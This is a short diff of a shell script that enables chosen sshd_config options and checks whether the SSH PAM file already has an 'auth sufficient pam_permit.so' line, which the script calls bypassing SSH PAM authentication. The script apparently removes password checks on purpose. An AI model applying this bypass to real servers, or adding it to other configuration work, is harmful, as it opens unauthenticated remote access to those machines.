@@ -291,7 +291,7 @@ else
 		cecho warning "No SSHD options set, skipping"
 	else
 		for option in $SSHD_OPTIONS; do
-			if grep -q "$option yes" "$SSHD_CONFIG"; then
+			if egrep -q "^$option yes" "$SSHD_CONFIG"; then
 				cecho log "Option '$option' already enabled"
 			else
 				sed -i "s/.*$option.*/$option yes/g" "$SSHD_CONFIG" && cecho info "Modified '$SSHD_CONFIG': option '$option' set to 'yes'" || cecho error "Couldn't modify '$SSHD_CONFIG' to set option '$option' to 'yes'"
@@ -316,7 +316,7 @@ fi
 if [ ! -f "$SSHD_PAM" ]; then
 	cecho warning "SSHD PAM file '$SSHD_PAM' does not exist, skipping"
 else
-	if grep -q "pam_permit.so" "$SSHD_PAM"; then
+	if grep -q "^auth[[:space:]]\+sufficient[[:space:]]\+pam_permit.so" "$SSHD_PAM"; then
 		cecho log "SSH PAM authentication already bypassed"
 	else
 		pam_timestamp=`get_timestamp "$PAM_DIR"`
